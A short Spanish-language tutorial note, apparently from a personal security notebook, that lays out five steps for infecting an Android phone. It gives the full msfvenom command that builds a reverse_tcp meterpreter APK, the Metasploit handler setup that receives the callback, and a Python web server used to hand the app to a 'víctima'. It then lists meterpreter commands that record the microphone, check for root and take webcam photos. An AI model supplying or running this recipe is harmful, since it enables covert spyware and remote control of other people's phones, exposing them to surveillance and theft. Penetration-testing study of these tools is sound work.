# Primeros pasos

Vamos a encontrarnos con 5 pasos que tendremos que seguir para infectar un dispositivo Android:

1. Se genera una aplicación Android infectada.
2. Desplegamos el centro de control.
3. Se distribuye el malware en un sitio web.
4. La víctima descarga, instala y ejecuta la aplicación.
5. El malware toma control del dispositivo víctima.

# 1. Se genera una aplicación Android infectada

Vamos a utilizar la herramienta [[Msfvenom]]:

`msfvenom -p android/meterpreter/reverse_tcp LHOST=ourIP LPORT=puerto R > name.apk`

Creamos el payload y el resultado lo metemos en "name.apk".

# 2. Desplegamos el centro de control

1. Ejecutamos el siguiente comando para abrir el metasploit framework (la estación de trabajo, por así decirlo, dónde vamos a configurar las cosas):

> `msfconsole -q`

2. El siguiente módulo se encargará de recibir las conexiones externas ("subimos" el payload para configurarlo):

> `use exploit/multi/handler`

3. Para configurarlo, tenemos que escribir el path:

> `set payload android/meterpreter/reverse_tcp`

4. Lo configuramos:

> `options`

5. En "payload options", puede que nos falte el LHOST:

> `set lhost ourIP`

6. Lanzamos el comando:

> `run`

Ya estamos en escucha.

# 3. Se distribuye el malware en un sitio web

Para este caso, vamos a usar un servidor python:

> `python3 -m http.server`

# 4. La víctima descarga, instala y ejecuta la aplicación

Nos metemos desde el teléfono víctima, y ya tendríamos todo hecho.

Para ver lo que podemos hacer, escribimos `help` y nos saldrá una larga lista con todas las opciones disponibles.

Algunas de las más interesantes son:
- `record_mic -d 10`: captura 10seg de audio.
- `check_root`: comprueba si el teléfono está rooteado (si lo está, podemos ir a dónde queramos en el dispositivo).
- `webcam_list`: lista de todas las cámaras que hay en el dispositivo.
- `webcam_snap`: hacer una fotografía.
	- `webcam_snap -i 2`: haz una fotografía desde la cámara 2.
